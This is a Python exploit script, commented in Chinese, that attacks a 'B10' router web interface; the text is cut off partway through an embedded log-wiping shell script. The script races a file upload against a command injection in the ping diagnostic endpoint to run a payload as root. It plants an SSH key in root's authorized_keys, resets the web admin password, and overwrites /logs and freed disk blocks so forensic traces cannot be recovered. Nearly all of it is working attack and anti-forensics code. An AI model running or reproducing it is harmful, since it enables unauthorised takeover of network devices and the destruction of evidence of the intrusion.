#!/usr/bin/env python3
"""run.py (v2) — B10 基线 getshell：抢窗口装 SSH 公钥，拿真 root shell。

链路（真机 1.2402.617 已验证，与 v1 完全一致）：
  1) POST /usb_web_app.cgi?v=import   把 payload.sh 落到 /tmp/b10sk.sh
     —— 但该文件在**响应返回之前**就被 cs_sudo rm -f 删了，所以必须抢窗口
  2) 并发 POST /troubleshooting_web_app.cgi?ping
     ipaddress = --help%26/bin/sh%3C/tmp/b10sk.sh
     —— & 立刻执行第二段，< 把脚本喂给 sh（文件 0644 无 +x 也能跑）
  3) 脚本以 uid=0 运行，把公钥写进 /root/.ssh/authorized_keys（600 root:root）
  4) ssh -i <key> root@<host>   → uid=0 gid=0(root)
  5) 复用这条 SSH 通道收尾（**默认开启**，--no-wipe-logs 关闭）：
     a. cfgcli 改 Web 管理密码 + --save-flash-now 落 flash
     b. 就地覆写 /logs（见下方 WIPE_LOGS_SH 的说明）
     a 必须在 b 之前——改密码会在 /logs 留记录，紧接着的覆写把它一起盖掉

v2 与 v1 的差异（链路、参数、输出全部不变，只换了实现底座）：
  · 单文件零第三方依赖：B10Client/SOCKS5（原 exploit_chain/pwn.py）已折进来，
    登录的 AES-128-CBC 改为内置纯 Python 实现（每次运行只加密 ~400B，性能无关），
    RSA 本来就是纯整数运算 —— 不再需要 pycryptodome，也不再兜底调 openssl CLI
  · SSH 收尾不再依赖 paramiko：直接调系统 ssh（OpenSSH），脚本经 stdin 喂给
    远端 sh。走 SOCKS5 时本地起一个中转线程（listen 127.0.0.1 随机端口，
    每条连接经 SOCKS5 隧道转发到 <host>:22），不用 ProxyCommand/nc
    —— Windows 上没有 nc，ProxyCommand 还要过 cmd.exe 的引号解析
  · b10key/b10key.pub 沿用 v1 那对（tag=b10-p92）——设备上若还装着这把公钥
    （同一次开机没重启），直接验 SSH 就过，不用重新抢窗口；
    文件缺失时兜底用 ssh-keygen 现生成 ed25519 对

运行环境：python3.8+ 标准库 + PATH 里的 ssh / ssh-keygen。

抢窗口命中率的关键（踩出来的）：**窗口长短由脚本正文内容决定**。
文件落盘后 CGI 会把它交给 cfgmgr（`cfg_configFileToFlash2`）解析，正文不同、耗时不同。
同样是 500 次上传：942 字节的精简脚本**零命中**，1252 字节的脚本十几秒就中。
所以 `--pad` 默认给 payload 追加 32KB 注释填充，把窗口撑开 —— **别把它设成 0**。

注意：不持久。/ 是 overlayfs 且 upperdir=/tmp/root/upper 在 tmpfs 上，重启即失效。

用法:
  python run.py                     # 打，装公钥，验 SSH，改密码+清 /logs（默认全做）
  python run.py --scheme https --port 443   # WebUI 默认就是 https/443，证书不校验
  python run.py --scheme http --port 80     # 退回明文
  python run.py --web-password 'Xx@1234'   # 改用的 Web 密码（默认 Admin@123）
  python run.py --no-wipe-logs      # 同上但不动 /logs（也不改密码）
  python run.py --restore           # 打之前先备份，打完还原（跑完不给 shell）
  python run.py --pubkey ~/.ssh/id_ed25519.pub --key ~/.ssh/id_ed25519
  python run.py --host 192.168.12.1 --race 40
  python run.py --no-socks5         # 直连目标，不走 socks5://127.0.0.1:1081
"""
import argparse
import base64
import functools
import http.client
import json
import os
import re
import select
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))

# Windows 控制台默认 GBK，而设备侧脚本/输出里有 ⓪ 这类非 GBK 字符
# （WIPE_LOGS_SH 的步骤编号），print 时会 UnicodeEncodeError 把收尾那步打断。
# 统一转 UTF-8 且遇错替换。
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

BD = "----b10sk"
FNAME = "b10sk.sh"
SHELL_PROXY = "socks5://127.0.0.1:1081"


# ==========================================================================
# SOCKS5 传输层（纯 stdlib：socket 子类自己做 CONNECT 握手）
# ==========================================================================
class socks5socket(socket.socket):
    """socket subclass that tunnels through a SOCKS5 proxy (no auth)."""

    def __init__(self, proxy_host, proxy_port, dest_host, dest_port,
                 timeout=20):
        super().__init__(socket.AF_INET, socket.SOCK_STREAM)
        self.settimeout(timeout)
        super().connect((proxy_host, int(proxy_port)))
        super().sendall(b"\x05\x01\x00")            # greet: no-auth
        r = self._recvn(2)
        if r[:1] != b"\x05" or r[1:2] != b"\x00":
            raise OSError(f"SOCKS5 greet rejected: {r.hex()}")
        addr = dest_host.encode()
        req = (b"\x05\x01\x00\x03" + bytes([len(addr)]) + addr
               + struct.pack(">H", int(dest_port)))
        super().sendall(req)
        r = self._recvn(4)
        if r[1:2] != b"\x00":
            raise OSError(f"SOCKS5 CONNECT failed code={r[1]}")
        atyp = r[3:4]
        if atyp == b"\x01":
            self._recvn(4 + 2)
        elif atyp == b"\x03":
            n = self._recvn(1)[0]
            self._recvn(n + 2)
        elif atyp == b"\x04":
            self._recvn(16 + 2)

    def _recvn(self, n):
        buf = b""
        while len(buf) < n:
            c = super().recv(n - len(buf))
            if not c:
                break
            buf += c
        return buf


class _Socks5HTTPConnection(http.client.HTTPConnection):
    _proxy = None                    # (host, port)

    def connect(self):
        if self._proxy:
            self.sock = socks5socket(self._proxy[0], self._proxy[1],
                                     self.host, self.port, self.timeout)
        else:
            super().connect()


class _Socks5HTTPSConnection(http.client.HTTPSConnection):
    _proxy = None

    def connect(self):
        if self._proxy:
            self.sock = socks5socket(self._proxy[0], self._proxy[1],
                                     self.host, self.port, self.timeout)
            self.sock = self._context.wrap_socket(self.sock,
                                                  server_hostname=self.host)
        else:
            super().connect()


def build_opener(proxy=None, https_unverified=True):
    """urllib opener routing through socks5://host:port when given."""
    if not proxy:
        return urllib.request.build_opener(
            urllib.request.HTTPSHandler(
                context=ssl._create_unverified_context())
            if https_unverified else urllib.request.HTTPSHandler)
    assert proxy.startswith("socks5://"), "--proxy must be socks5://host:port"
    phost, pport = proxy[len("socks5://"):].rsplit(":", 1)

    def conn_cls(base, scheme):
        class C(base):
            pass
        C._proxy = (phost, pport)
        C.default_port = 80 if scheme == "http" else 443
        C.__name__ = f"Socks5{scheme.upper()}Connection"
        return C

    class H(urllib.request.HTTPHandler):
        def http_open(self, req):
            return self.do_open(
                functools.partial(conn_cls(_Socks5HTTPConnection, "http")),
                req)

    class HS(urllib.request.HTTPSHandler):
        def __init__(self):
            super().__init__(
                context=ssl._create_unverified_context()
                if https_unverified else None)

        def https_open(self, req):
            return self.do_open(
                functools.partial(conn_cls(_Socks5HTTPSConnection, "https")),
                req,
                context=self._context)

    return urllib.request.build_opener(H, HS)


# ==========================================================================
# AES-128-CBC —— 纯 Python。只有登录那一次 ~400B 的加密会走这里，慢无所谓。
# S-box 用 Rijndael 的代数生成法现场算（GF(2^8) 逆元 + 仿射变换），
# 免得抄 256 字节常量表抄错一个字节。
# ==========================================================================
def _rotl8(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xFF


def _build_aes_tables():
    sbox = [0] * 256
    p = q = 1
    while True:
        p = (p ^ ((p << 1) & 0xFF) ^ (0x1B if p & 0x80 else 0)) & 0xFF  # p *= 3
        q ^= (q << 1) & 0xFF
        q ^= (q << 2) & 0xFF
        q ^= (q << 4) & 0xFF
        if q & 0x80:
            q ^= 0x09                                                 # q /= 3
        sbox[p] = (q ^ _rotl8(q, 1) ^ _rotl8(q, 2)
                   ^ _rotl8(q, 3) ^ _rotl8(q, 4) ^ 0x63)
        if p == 1:
            break
    sbox[0] = 0x63
    inv = [0] * 256
    for i, v in enumerate(sbox):
        inv[v] = i
    return sbox, inv


_SBOX, _INV_SBOX = _build_aes_tables()
_RCON = (0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)
AES_BLOCK = 16


def _gmul(a, b):
    """GF(2^8) 乘法（AES 多项式 0x11B）。"""
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        b >>= 1
        a = ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1)
    return p


def _key_expand(key):
    """16B 密钥 -> 44 个 4 字节轮密钥字。"""
    w = [list(key[4 * i:4 * i + 4]) for i in range(4)]
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            # SubWord(RotWord(t)) ^ rcon
            t = [_SBOX[t[1]] ^ _RCON[i // 4 - 1],
                 _SBOX[t[2]], _SBOX[t[3]], _SBOX[t[0]]]
        w.append([a ^ b for a, b in zip(w[i - 4], t)])
    return w


def _shift_rows(s):
    # 状态按列存：flat 下标 = col*4 + row；第 row 行左移 row
    o = list(s)
    for row in range(1, 4):
        for col in range(4):
            o[col * 4 + row] = s[((col + row) % 4) * 4 + row]
    return o


def _inv_shift_rows(s):
    o = list(s)
    for row in range(1, 4):
        for col in range(4):
            o[((col + row) % 4) * 4 + row] = s[col * 4 + row]
    return o


def _mix_columns(s):
    o = [0] * 16
    for c in range(4):
        a = s[4 * c:4 * c + 4]
        o[4 * c + 0] = _gmul(a[0], 2) ^ _gmul(a[1], 3) ^ a[2] ^ a[3]
        o[4 * c + 1] = a[0] ^ _gmul(a[1], 2) ^ _gmul(a[2], 3) ^ a[3]
        o[4 * c + 2] = a[0] ^ a[1] ^ _gmul(a[2], 2) ^ _gmul(a[3], 3)
        o[4 * c + 3] = _gmul(a[0], 3) ^ a[1] ^ a[2] ^ _gmul(a[3], 2)
    return o


def _inv_mix_columns(s):
    o = [0] * 16
    for c in range(4):
        a = s[4 * c:4 * c + 4]
        o[4 * c + 0] = (_gmul(a[0], 14) ^ _gmul(a[1], 11)
                        ^ _gmul(a[2], 13) ^ _gmul(a[3], 9))
        o[4 * c + 1] = (_gmul(a[0], 9) ^ _gmul(a[1], 14)
                        ^ _gmul(a[2], 11) ^ _gmul(a[3], 13))
        o[4 * c + 2] = (_gmul(a[0], 13) ^ _gmul(a[1], 9)
                        ^ _gmul(a[2], 14) ^ _gmul(a[3], 11))
        o[4 * c + 3] = (_gmul(a[0], 11) ^ _gmul(a[1], 13)
                        ^ _gmul(a[2], 9) ^ _gmul(a[3], 14))
    return o


def _aes_enc_block(w, blk):
    s = [b ^ w[i // 4][i % 4] for i, b in enumerate(blk)]
    for rnd in range(1, 10):
        s = [_SBOX[b] for b in s]
        s = _shift_rows(s)
        s = _mix_columns(s)
        s = [s[i] ^ w[4 * rnd + i // 4][i % 4] for i in range(16)]
    s = [_SBOX[b] for b in s]
    s = _shift_rows(s)
    return bytes(s[i] ^ w[40 + i // 4][i % 4] for i in range(16))


def _aes_dec_block(w, blk):
    s = [b ^ w[40 + i // 4][i % 4] for i, b in enumerate(blk)]
    for rnd in range(9, 0, -1):
        s = _inv_shift_rows(s)
        s = [_INV_SBOX[b] for b in s]
        s = [s[i] ^ w[4 * rnd + i // 4][i % 4] for i in range(16)]
        s = _inv_mix_columns(s)
    s = _inv_shift_rows(s)
    s = [_INV_SBOX[b] for b in s]
    return bytes(s[i] ^ w[i // 4][i % 4] for i in range(16))


def pkcs7_pad(b: bytes) -> bytes:
    n = AES_BLOCK - len(b) % AES_BLOCK
    return b + bytes([n]) * n


def pkcs7_unpad(b: bytes) -> bytes:
    return b[: -b[-1]] if b and 0 < b[-1] <= AES_BLOCK else b


def aes_cbc_encrypt(key: bytes, iv: bytes, pt: bytes) -> bytes:
    w = _key_expand(key)
    out = b""
    prev = iv
    for i in range(0, len(pt), AES_BLOCK):
        blk = bytes(x ^ y for x, y in zip(pt[i:i + AES_BLOCK], prev))
        prev = _aes_enc_block(w, blk)
        out += prev
    return out


def aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
    w = _key_expand(key)
    out = b""
    prev = iv
    for i in range(0, len(ct), AES_BLOCK):
        blk = ct[i:i + AES_BLOCK]
        out += bytes(x ^ y for x, y in zip(_aes_dec_block(w, blk), prev))
        prev = blk
    return out


# ==========================================================================
# RSA + 前端 base64 变体（纯整数运算，无外部依赖）
# ==========================================================================
def rsa_pkcs1_encrypt(pub_der: bytes, msg: bytes) -> bytes:
    """RSA PKCS#1 v1.5 encryption, pure python. pub_der = DER SubjectPublicKeyInfo."""
    # parse minimal SPKI: find modulus/expert via naive DER walk
    def der_int(buf, i):
        assert buf[i] == 0x02
        ln = buf[i + 1]
        j = i + 2
        if ln & 0x80:
            n = ln & 0x7F
            ln = int.from_bytes(buf[j:j + n], "big")
            j += n
        return int.from_bytes(buf[j:j + ln], "big"), j + ln

    def read_tag(buf, i, tag):
        assert buf[i] == tag, f"DER tag {buf[i]:#x} != {tag:#x}"
        ln = buf[i + 1]
        j = i + 2
        if ln & 0x80:
            n = ln & 0x7F
            ln = int.from_bytes(buf[j:j + n], "big")
            j += n
        return j + ln, ln

    end, _ = read_tag(pub_der, 0, 0x30)          # outer SEQUENCE
    i = 2 + (pub_der[1] & 0x7F if pub_der[1] & 0x80 else 0)
    end1, _ = read_tag(pub_der, i, 0x30)         # AlgIdentifier SEQUENCE
    i = end1
    endbs, lnbs = read_tag(pub_der, i, 0x03)     # BIT STRING
    i = endbs - lnbs + 1                         # content start + skip unused-bits byte
    end2, ln2 = read_tag(pub_der, i, 0x30)       # inner RSAPublicKey SEQUENCE
    n, j = der_int(pub_der, end2 - ln2)
    e, _ = der_int(pub_der, j)
    k = (n.bit_length() + 7) // 8
    # PKCS#1 v1.5: EM = 0x00 || 0x02 || PS || 0x00 || M
    padlen = k - 3 - len(msg)
    if padlen < 8:
        raise ValueError("message too long for RSA key")
    ps = bytes(os.urandom(padlen)).replace(b"\x00", b"\x01")  # non-zero PS
    em = b"\x00\x02" + ps + b"\x00" + msg
    c = pow(int.from_bytes(em, "big"), e, n)
    return c.to_bytes(k, "big")


def pem_to_der(pubkey_pem: str) -> bytes:
    """PEM -> DER without openssl CLI (PEM body is the base64 of DER).
    Tolerates single-line PEMs (device serves the header/body inline)."""
    t = pubkey_pem
    for marker in ("-----BEGIN PUBLIC KEY-----", "-----END PUBLIC KEY-----",
                   "-----BEGIN RSA PUBLIC KEY-----",
                   "-----END RSA PUBLIC KEY-----"):
        t = t.replace(marker, "")
    return base64.b64decode("".join(t.split()))


def b64url_escape(b) -> str:
    """frontend escape(): + -> -  / -> _  = -> . (accepts str or bytes)."""
    if isinstance(b, str):
        return b.replace("+", "-").replace("/", "_").replace("=", ".")
    return (base64.b64encode(b).decode()
            .replace("+", "-").replace("/", "_").replace("=", "."))


def b64url_sjcl(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def encrypt_payload(plaintext: str, pubkey_pem: str):
    """app.cgi POST body: encrypted=1&ct=<b64url AES-CBC>&ck=<RSA-wrap>."""
    aes_key = os.urandom(16)
    aes_iv = os.urandom(16)
    ct = aes_cbc_encrypt(aes_key, aes_iv, pkcs7_pad(plaintext.encode()))
    keyinfo = (base64.b64encode(aes_key) + b" " + base64.b64encode(aes_iv))
    rsa_ct = rsa_pkcs1_encrypt(pem_to_der(pubkey_pem), keyinfo)
    ct_field = b64url_sjcl(ct)
    ck_field = b64url_escape(rsa_ct)
    return f"encrypted=1&ct={ct_field}&ck={ck_field}", aes_key, aes_iv


def sjcl_b64url_decode(s: str) -> bytes:
    """sjcl codec.base64url alphabet (-,_) no padding -> raw bytes."""
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def decrypt_response(body: str, key: bytes, iv: bytes) -> str:
    """Decrypt an encrypted=1 style response (bare ct or JSON w/ ct field)."""
    ct = body
    try:
        j = json.loads(body)
        if isinstance(j, dict):
            ct = j.get("ct") or j.get("data") or body
    except Exception:
        pass
    try:
        pt = aes_cbc_decrypt(key, iv, sjcl_b64url_decode(ct.strip()))
        return pkcs7_unpad(pt).decode("utf-8", "replace")
    except Exception as e:
        return f"<decrypt failed: {e}> {body[:200]}"


# ==========================================================================
# B10 WebUI 客户端（登录拿 sid/csrf_token）
# ==========================================================================
class B10Client:
    def __init__(self, host, user, password, proxy=None, scheme="https"):
        self.base = f"{scheme}://{host}"
        self.user = user
        self.password = password
        self.pubkey = None
        self.basic = base64.b64encode(f"{user}:{password}".encode()).decode()
        self.opener = build_opener(proxy)
        self.sid = None
        self.token = None
        self.dec_key = None
        self.dec_iv = None

    def request(self, path, body=None, headers=None, timeout=20,
                use_session=False):
        url = self.base + path
        h = {}
        if use_session and self.sid:
            h["Cookie"] = f"sid={self.sid}"
        else:
            h["Authorization"] = "Basic " + self.basic
        if headers:
            h.update(headers)
        data = body.encode() if isinstance(body, str) else body
        req = urllib.request.Request(url, data=data, headers=h)
        resp = self.opener.open(req, timeout=timeout)
        raw = resp.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, raw, hdrs

    def fetch_nonce(self):
        """设备 pubkey + nonce（登录前，对应前端 getNonce）。"""
        st, body, _ = self.request("/login_web_app.cgi?nonce")
        j = json.loads(body)
        if j.get("pubkey") and "-----BEGIN" not in j["pubkey"]:
            j["pubkey"] = ("-----BEGIN PUBLIC KEY-----\n" + j["pubkey"]
                           + "\n-----END PUBLIC KEY-----\n")
        return j

    def login(self):
        """完整登录（前端 encryptLoginDetails 的 nohash=1 分支）。"""
        j = self.fetch_nonce()
        nonce = j["nonce"]
        rkey = j.get("randomKey", "0")
        self.pubkey = self.pubkey or j.get("pubkey")
        assert self.pubkey, "no pubkey available for encrypted login"
        nonce_esc = b64url_escape(nonce)
        self.dec_key = os.urandom(16)
        self.dec_iv = os.urandom(16)
        plain = (f"userhash={urllib.parse.quote(self.user)}"
                 f"&RandomKeyhash={urllib.parse.quote(rkey)}"
                 f"&response={urllib.parse.quote(self.password)}"
                 f"&nonce={nonce_esc}"
                 f"&enckey={b64url_escape(self.dec_key)}"
                 f"&enciv={b64url_escape(self.dec_iv)}"
                 f"&nohash=1&hPassword=")
        body, _, _ = encrypt_payload(plain, self.pubkey)
        st, raw, hdrs = self.request(
            "/login_web_app.cgi", body,
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        pt = decrypt_response(raw, self.dec_key, self.dec_iv)
        # device returns the login JSON as PLAINTEXT (decrypt is a no-op here);
        # strip a decrypt-failure prefix before JSON parsing
        json_part = pt
        if json_part.startswith("<decrypt failed"):
            json_part = json_part.split("> ", 1)[1] if "> " in json_part else ""
        self.sid = hdrs.get("x-sid")
        m = None
        for line in raw.splitlines() + pt.splitlines():
            if "Set-Cookie" in line and "sid=" in line and "deleted" not in line:
                m = line.split("sid=")[1].split(";")[0]
        self.sid = self.sid or m
        mt = re.search(r'"token"\s*:\s*"([^"]+)"', json_part)
        ms = re.search(r'"sid"\s*:\s*"([^"]+)"', json_part)
        self.token = mt.group(1) if mt else None
        self.sid = self.sid or (ms.group(1) if ms else None)
        return st, pt, hdrs


# ==========================================================================
# WebUI 地址
# ==========================================================================
# WebUI 走 https/443（默认）。证书不校验 —— 两条路都成立，所以不需要额外开关：
#   · 走 socks5：build_opener() 装的 SOCKS5 HTTPSHandler，context 写死
#     ssl._create_unverified_context()
#   · 直连：build_opener(None) 也显式传 ssl._create_unverified_context()
def web_netloc(host, scheme, port):
    """拼 host[:port]。默认端口省略 —— urlopen 会按 scheme 自己补 443/80。"""
    if ":" in host:                     # 调用方已经带了端口，别覆盖
        return host
    dflt = 443 if scheme == "https" else 80
    return host if port == dflt else "%s:%d" % (host, port)


def web_base(host, scheme, port):
    return "%s://%s" % (scheme, web_netloc(host, scheme, port))


def proxy_addr(proxy):
    """'socks5://host:port' -> (host, port)。SSH 那条通道要自己建 socket，
    不能像 WebUI 那样把整串丢给 build_opener。"""
    assert proxy.startswith("socks5://"), "--proxy 只支持 socks5://host:port"
    h, p = proxy[len("socks5://"):].rsplit(":", 1)
    return h, int(p)


# ==========================================================================
# payload / multipart
# ==========================================================================
def make_payload(pubkey_path):
    pub = open(pubkey_path, encoding="utf-8").read().strip()
    tag = pub.split()[-1] if len(pub.split()) > 2 else "b10sshkey"
    tpl = open(os.path.join(HERE, "payload.sh.tpl"), encoding="utf-8").read()
    return tpl.replace("__PUBKEY__", pub).replace("__TAG__", tag), tag


def build_body(tok, payload):
    return (("--%s\r\nContent-Disposition: form-data; name=\"csrf_token\"\r\n\r\n%s\r\n"
             % (BD, tok)).encode()
            + ("--%s\r\nContent-Disposition: form-data; name=\"filename\"; "
               "filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n"
               % (BD, FNAME)).encode()
            + payload.encode()
            + ("\r\n--%s--\r\n" % BD).encode())


def race(base, sid, tok, iface, seconds, payload, opener_up, opener_inj,
         quiet=False, n_up=2, n_inj=4):
    """base 形如 https://192.168.12.1（由 web_base() 拼）。

    上传/注入各用独立 opener（v1 是两个共享 sid 的 B10Client，本质同此）。
    slow/maxs：注入请求的耗时。命中窗口时命令真的跑了，CGI 会等它跑完才回响应，
    于是出现一个明显偏慢的请求 —— 这是"窗口到底有没有抢到"的唯一可靠判据。
    """
    stat = {"up": 0, "inj": 0, "spa": 0, "err": 0, "slow": 0, "maxs": 0.0}
    stop = threading.Event()
    lock = threading.Lock()
    body = build_body(tok, payload)

    def uploader():
        while not stop.is_set():
            try:
                r = opener_up.open(urllib.request.Request(
                    base + "/usb_web_app.cgi?v=import&sl_num=usb1_1",
                    data=body,
                    headers={"Cookie": "sid=" + str(sid),
                             "Content-Type": "multipart/form-data; boundary=" + BD,
                             "Content-Length": str(len(body))}), timeout=30)
                r.read(); r.close()
                with lock:
                    stat["up"] += 1
            except Exception:
                with lock:
                    stat["err"] += 1
            time.sleep(0.05)

    def injector():
        payload_q = "--help%26/bin/sh%3C/tmp/" + FNAME
        b = ("csrf_token=" + tok + "&wan_conlist=2&ipaddress=" + payload_q
             + "&direction=&status=enable&domain=&wan_port=WAN"
             + "&waninterfacename=" + iface + "&portstatus=Connected&lan_port=LAN1"
             ).encode()
        while not stop.is_set():
            try:
                _t = time.time()
                r = opener_inj.open(urllib.request.Request(
                    base + "/troubleshooting_web_app.cgi?ping", data=b,
                    headers={"Cookie": "sid=" + str(sid),
                             "Content-Type":
                             "application/x-www-form-urlencoded"}), timeout=30)
                o = r.read().decode("utf-8", "replace"); r.close()
                dt = time.time() - _t
                if dt > 1.0:
                    print("[*] 注入耗时 %.1fs" % dt, flush=True)
                    stop.set()
                with lock:
                    if "<!doctype" in o.lower():
                        stat["spa"] += 1
                        # 留一份样本 —— 分不清是登录页、502 还是设备忙页时，这是唯一线索
                        stat.setdefault("spa_sample", o[:400])
                    else:
                        stat["inj"] += 1
                    if dt > 3.0:
                        stat["slow"] += 1
                    if dt > stat["maxs"]:
                        stat["maxs"] = dt
            except Exception:
                with lock:
                    stat["err"] += 1
            time.sleep(0.05)

    threads = [threading.Thread(target=uploader, daemon=True) for _ in range(n_up)]
    threads += [threading.Thread(target=injector, daemon=True) for _ in range(n_inj)]
    for t in threads:
        t.start()
    t0 = time.time()
    while time.time() - t0 < seconds:
        time.sleep(5)
        if not quiet:
            print("   %3ds 上传 %d  注入 ok=%d spa=%d err=%d 慢=%d 峰值=%.1fs"
                  % (time.time() - t0, stat["up"], stat["inj"], stat["spa"], stat["err"],
                     stat["slow"], stat["maxs"]), flush=True)
    stop.set()
    time.sleep(1)
    return stat


# ==========================================================================
# SSH 收尾：调系统 ssh（OpenSSH），不再依赖 paramiko
# ==========================================================================
def _fix_key_perms(path):
    """OpenSSH 会拒绝权限过开的私钥（v1 专门带了个 keyfix 工具干这事，v2 折进来）。
    Unix chmod 600；Windows 用 icacls 砍掉继承 ACE、只留当前用户。
    best-effort：失败不拦——Git Bash 的 ssh 在 noacl 挂载下本来就不查这个。"""
    try:
        if os.name == "nt":
            import getpass
            subprocess.run(["icacls", path, "/inheritance:r",
                            "/grant:r", getpass.getuser() + ":F"],
                           capture_output=True, check=True)
        else:
            os.chmod(path, 0o600)
    except Exception:
        pass


def ensure_keypair(key_path):
    """key 不在就用 ssh-keygen 生成 ed25519 临时对；.pub 丢了从私钥重新导出。"""
    pub = key_path + ".pub"
    if not os.path.exists(key_path):
        print("[*] %s 不存在，ssh-keygen 生成 ed25519 临时密钥对" % key_path,
              flush=True)
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "",
                        "-C", "b10-v2", "-f", key_path, "-q"], check=True)
    if not os.path.exists(pub):
        p = subprocess.run(["ssh-keygen", "-y", "-f", key_path],
                           capture_output=True, check=True)
        with open(pub, "wb") as f:
            f.write(p.stdout.strip() + b"\n")
    _fix_key_perms(key_path)
    return pub


class SocksRelay(threading.Thread):
    """本地 TCP 中转：listen 127.0.0.1:<随机端口>，把每条接入的连接
    原样经 SOCKS5 隧道转发到 (dst_host, dst_port)。

    走 SOCKS5 的 ssh 就靠它：ssh -p <本地端口> root@127.0.0.1。
    不用 ProxyCommand=nc -x ...：Windows 上没有 nc，且 Windows OpenSSH 的
    ProxyCommand 要过 cmd.exe 引号解析，路径带空格就翻车。"""

    def __init__(self, proxy_host, proxy_port, dst_host, dst_port):
        super().__init__(daemon=True)
        self.dst = (dst_host, int(dst_port))
        self.proxy = (proxy_host, int(proxy_port))
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", 0))
        self.srv.listen(8)
        self.srv.settimeout(0.2)
        self.port = self.srv.getsockname()[1]
        self._stop = threading.Event()

    def run(self):
        while not self._stop.is_set():
            try:
                c, _ = self.srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._pump, args=(c,), daemon=True).start()

    def _pump(self, c):
        try:
            up = socks5socket(self.proxy[0], self.proxy[1],
                              self.dst[0], self.dst[1], timeout=20)
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            return
        pair = [c, up]
        try:
            while True:
                r, _, _ = select.select(pair, [], [], 1.0)
                if not r:
                    continue
                for s in r:
                    data = s.recv(65536)
                    if not data:
                        return
                    (up if s is c else c).sendall(data)
        except Exception:
            pass
        finally:
            for s in pair:
                try:
                    s.close()
                except Exception:
                    pass

    def stop(self):
        self._stop.set()
        try:
            self.srv.close()
        except Exception:
            pass


def _ssh_argv(key_path, host, port):
    return ["ssh", "-i", key_path,
            "-o", "IdentitiesOnly=yes",
            "-o", "BatchMode=yes",            # 不许任何交互提示（密钥不对就快速失败）
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PasswordAuthentication=no",
            "-o", "ConnectTimeout=15",
            "-o", "LogLevel=ERROR",
            "-p", str(port),
            "root@%s" % host]


def ssh_exec(host, key_path, script, proxy=None, timeout=180):
    """经 SOCKS5（或直连）用公钥登录 root，跑一段 shell，返回 (退出码, 合并输出)。

    脚本经 stdin 喂给远端 `sh -s`——多行 WIPE_LOGS_SH 直接进命令行参数的话，
    引号/换行要过一层 Windows 命令行解析，stdin 最稳。
    """
    relay = None
    if proxy:
        ph, pp = proxy_addr(proxy)
        relay = SocksRelay(ph, pp, host, 22)
        relay.start()
        host, port = "127.0.0.1", relay.port
    else:
        port = 22
    try:
        p = subprocess.run(_ssh_argv(key_path, host, port) + ["sh", "-s"],
                           input=script.encode(),
                           capture_output=True, timeout=timeout)
        return p.returncode, (p.stdout + p.stderr).decode("utf-8", "replace")
    finally:
        if relay:
            relay.stop()


def ssh_check(host, key_path, proxy=None, timeout=20):
    """验公钥能登 root。失败抛 OSError（主流程按 v1 语义捕获）。"""
    rc, out = ssh_exec(host, key_path, "id; hostname; uname -sr", proxy, timeout)
    if rc != 0:
        raise OSError("ssh 退出码 %s: %s" % (rc, out.strip()[-200:]))
    return out


# ---- /logs 清理 ----
#
# 为什么不能只 rm：syslog-ng 持有 5 个 /logs 文件的 fd、ndk_wand 持有 1 个。
# rm 只解除链接，inode 与数据块仍留在 p30 上，进程还继续往已删除的 inode 写，
# 拿 p30 裸分区跑 strings 照样捞得到。
#
# 两层，缺一不可：
#
#   ① 就地覆写「当前存在的文件」
#      ext4 对**已分配区间**的覆写不重新分配块，dd conv=notrunc 保证不截断、
#      不新建块 → 零直接盖在同一批物理数据块上。文件在删除前就已经是零。
#      真机实测：214,890 B 文件含 4000 处唯一标记，覆写前裸分区命中 4000 → 覆写后 0。
#
#   ②b 有界零填「已释放的块」—— ① 够不着的那部分（见下）
#
# 覆盖范围（2026-09-21 修正）：
#   ① 只覆盖「当前存在的文件」。**实测这不够** —— 抢窗口 40 秒里 CGI 疯狂写日志、
#      文件涨大又被轮转切掉，那些「已释放但仍是脏数据」的块 ① 够不着。
#      单次 run 后裸分区仍有 4213 处 b10sk / 3754 处 ipaddress= / 明文口令，
#      所以加了 ②b。
#
#   ②b 为什么不直接填到 ENOSPC（§3 v1 的做法，也有效但危险）：
#   填满期间所有写入方 ENOSPC；中途断了会把 /logs 停在 100%，而下次开机
#   check_logs_partition 看到 ≥99% 会整个清掉；data_guardian 的 backup_log
#   在剩余 <1MB 时拒绝备份；还白磨 55MB eMMC。
#   ②b 改成 97% 封顶 + 多趟不同粒度，避开这些 —— 代价是**覆盖率不是 100%**，
#   必须用裸分区复检闭环，不能只看 df。
WIPE_LOGS_SH = r'''
echo "[*] /logs 清理开始 $(date)"
df -k /logs
echo "[*] 文件数: $(find /logs -type f | wc -l)"

# ⓪ 改 Web 密码并落 flash
#    必须放在 ① 之前 —— cfgcli/cfgmgr 会把这次改动写进 /logs/messages、/logs/lib
#    等，紧接着的 ① 会把它们一起覆盖掉。放后面就白改了（等于自己给自己留证据）。
#    --save-flash-now 是必须的，否则只改内存 db，重启即失效。
cfgcli -s "InternetGatewayDevice.X_Authentication.WebAccount.Password" "__WEB_PASSWORD__"
cfgcli --save-flash-now
echo "[*] ⓪ Web 密码已设置并落 flash"

# ① 就地覆写：按原长度写零，复用原有数据块，不碰空闲空间
find /logs -type f | while read -r f; do
    sz=$(stat -c%s "$f" 2>/dev/null)
